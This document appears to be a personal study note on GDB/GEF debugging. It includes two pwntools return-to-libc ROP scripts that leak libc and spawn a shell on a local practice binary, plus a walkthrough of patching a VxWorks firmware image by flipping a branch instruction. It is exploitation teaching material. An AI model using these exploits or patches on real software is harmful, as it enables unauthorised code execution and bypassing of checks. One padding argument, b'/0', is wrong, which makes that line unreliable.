# GDB/GEF Notes & Techniques

**<u>Getting symbols of table</u>**

```bash
readelf -s ./libc.so.6
```



**<u>Setting Breakpoints:</u>**

```bash
gef➤ b main
Breakpoint 1 at 0xa45c: file gitGrabber.cpp, line 239.
gef➤ run

#generally want to break at the RET at the bottom of a functions
gef➤ disassemble function_name
gef➤ b *0xret_instr_at_bottom_of_function
gef➤ c
```



**<u>Calling Functions:</u>**

```bash
gef➤  call function_name(0x12)
$2 = 0x7f43678f69b4 "3)\302\021\277\023\016\221\222\254'\343\271\323.\200b\252\203voM\a.ڼT\bjWKs"

#hexdumping 
gef➤  hexdump byte 0x7f43678f69b4 --size 32
0x00007f43678f69b4     33 29 c2 11 bf 13 0e 91 92 ac 27 e3 b9 d3 2e 80    3)........'.....
0x00007f43678f69c4     62 aa 83 76 6f 4d 07 2e da bc 54 08 6a 57 4b 73    b..voM....T.jWKs
```
If you do not have the source code of debugged program, you can find interested function names using the nm command:
```bash

nm .\test.exe|findstr "sayhi"
00401410 T __Z5sayhiv
```
The callable functions have a “T” prefixed and their names are mangled. 00401410 is the address of  function. The call command actually calls the function at address 0x00401410. You can jump to that function instead of calling it.
```bash

(gdb) jump sayhi
Continuing at 0x401416.
hi
[New Thread 11932.0x2050]
[Inferior 1 (process 11932) exited normally]
```
Of course, the result is the crashing of the inferior because jump command does not prepare a frame for that function, the returning of the function will corrupt the stack.

If Python scripting is supported in your GDB, you can use the python api to evaluate a function:
```bash

python gdb.parse_and_eval("((void(*)())sayhi)()")
```
Note that you may need to specify the type of the function, otherwise(like the following), you may get the error:
```bash

python gdb.parse_and_eval("sayhi()")

gdb.error: 'sayhi()' has unknown return type; cast the call to its declared return type
Error while executing Python code.

```

**<u>Inspecting</u>**

```bash
#x for examine, g for 8 bytes, x for hex
gef➤ x/gx $rsp

#examine for string
gef➤ x/s 0xaddress

#printing function addr
gef➤ p system
gef➤ p puts

#check memory map
gef➤ vm

#seeing more instructions
gef➤ telescope 0xaddress 64

#searching for address
gef➤ grep /bin/sh
```



**<u>Pattern</u>**

```bash
gef➤ pattern create 200
gef➤ pattern offset $rsp
```





### Return to LIBC Rop Chain

RELRO = Global offset table is read and writable

NX enabled = can't just execute shellcode

No PIE = ASLR won't affect base address

```python
#!/usr/bin/env python3

from pwn import *

p = process("./vuln")
gdb.attach(p)

offset = 136
junk = b"A" * offset

"""
Plan of attack:
1. Use puts to leak to an address
2. Supply argument to puts
3. Use x64 calling conventions, which means rdi is first argument
4. After the lea, we can calculate offset between the function that was leaked and the function we want

"""

#found using ropgadget command
pop_rdi = 0xaddress
#found by going into the .got.plt in ghidra and finding setbuf
setbuf_at_got = 0xaddress
#found by going into the .plt to find puts
puts_at_plt = 0xaddress
#found in ghidra memory
back_to_main = 0xaddress

payload = [
    junk,
    #call puts to display/leak the true setbuf address
    p64(pop_rdi),
    p64(setbuf_at_got),
    p64(puts_at_plt),
    #jump back to safe place so we don't crash
    p64(back_to_main),
    
]

payload = b"".join(payload)
p.sendline(payload)

#store response of leak
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

#readelf -s libc.so.6 | grep -i setbuf
setbuf_offset = 0xaddress
base_address_of_libc = leak - setbuf_offset
log.info(f"{hex(base_address_of_libc)=}")

#readelf -s libc.so.6 | grep system
system_offset = 0xaddress
system_address = base_address_of_libc + system_offset

#gef➤ grep /bin/sh, take that first address
#gef➤ vm, grab starting address of libc.so.6
#gef➤ p 0xgrep_address - 0xstarting_addr
bin_sh_offset = 0xaddress
bin_sh_address = base_address_of_libc + bin_sh_offset

#ROPgadget --binary vuln | grep ": ret"
ret_instr = 0xaddr

second_payload = [
    
    junk,
    p64(pop_rdi),
    p64(bin_sh_address),
    #needed for stack alignment, stack ptr's last hex digit must be 0, ret will pop from stack and make it 0, movdqu instruction with xxm registers will need alignment
    p64(ret_instr),
    p64(system_address),
    
]

second_payload = b"".join(second_payload)
p.sendline(second_payload)

p.interactive()
```

Last 4 nibbles need to be 0 for a libc address leak



### Using pwntools

```bash
#first fix and link the binary
#check with ldd
ldd vuln
#get this from github and run in directory with the binary and libc file
$ pwninit

#links to the generated linked
patchelf --set-interpreter ./ld-2.27.so ./vuln

```



```python
#!/usr/bin/env python3

from pwn import *

context.binary = binary = './vuln'

vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')
vuln_rop = ROP(vuln_elf)
p = process('./vuln')

padding = b'A'*136

payload = padding

#returns list of all matching gadgets, just take first 1
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.got.setbuf)
payload += p64(vuln_elf.plt.puts)
payload += p64(vuln_elf.symbols.main)

p.sendlineafter('text that you want the payload to send after', payload)
p.recvuntil('text that shows up before the leak\n')

leak = u64(p.recvline().strip().ljust(8, b'/0'))
log.info(f'{hex(leak)}')

libc.address = leak - libc.symbols.setbuf
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)

p.interactive()

```

Following the previous example, we know the address of the instruction we cant to change is 0x0016806c, but if you go into a hex editor (using vim as an example):
```bash
vim vxworks.st
:%!xxd
#then revert after making edits and save
:%!xxd -r 
:wq
```

We don't actually see that BNE instruction at the address. That's because we need to calculate it's runtime address of where it actually is. That math is as follows:

Offset of Code section relative to binary (.text addr) + (Absolute address of the instruction we want to change (0x0016806c) - Starting address of the code section (.text))

Using the command readelf we can get the .text section info:

```bash
readelf -e vxWorks.st

ELF Header:
  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, big endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           PowerPC
  Version:                           0x1
  Entry point address:               0x10000
  Start of program headers:          52 (bytes into file)
  Start of section headers:          35192516 (bytes into file)
  Flags:                             0x80000000, emb
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           40 (bytes)
  Number of section headers:         13
  Section header string table index: 10

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        00010000 000060 290e30 00 WAX  0   0 16
  [ 2] .data             PROGBITS        002a0e30 290e90 0470f0 00  WA  0   0  8
  [ 3] .bss              NOBITS          002e7f20 2d7f80 14bb10 00  WA  0   0  8
  [ 4] .debug_aranges    PROGBITS        00000000 2d7f80 0019a0 00      0   0  1
  [ 5] .debug_pubnames   PROGBITS        00000000 2d9920 019f3e 00      0   0  1
  [ 6] .debug_info       PROGBITS        00000000 2f385e 1cc0fd0 00      0   0  1
  [ 7] .debug_abbrev     PROGBITS        00000000 1fb482e 0475fd 00      0   0  1
  [ 8] .debug_line       PROGBITS        00000000 1ffbe2b 194004 00      0   0  1
  [ 9] .debug_frame      PROGBITS        00000000 218fe30 000014 00      0   0  4
  [10] .shstrtab         STRTAB          00000000 218fe44 00007e 00      0   0  1
  [11] .symtab           SYMTAB          00000000 21900cc 02a0d0 10     12 4626  4
  [12] .strtab           STRTAB          00000000 21ba19c 034f51 00      0   0  1

Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  v (VLE), p (processor specific)

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000060 0x00010000 0x00010000 0x2d7f20 0x423a30 RWE 0x10

 Section to Segment mapping:
  Segment Sections...
   00     .text .data .bss 
```
Now using the .text section's info we can finally do the hex calculation:

0016806c (absolute addr) – 00010000 (.text starting addr) = 15806C
15806C + 000060 (.text offset) = 1580CC

Thus 0x1580CC is where the BNE instruction will be in the hex.
The BNE instruction can be modified to a BEQ instruction using vim and xxd:
4082 0014 to 4182 0014
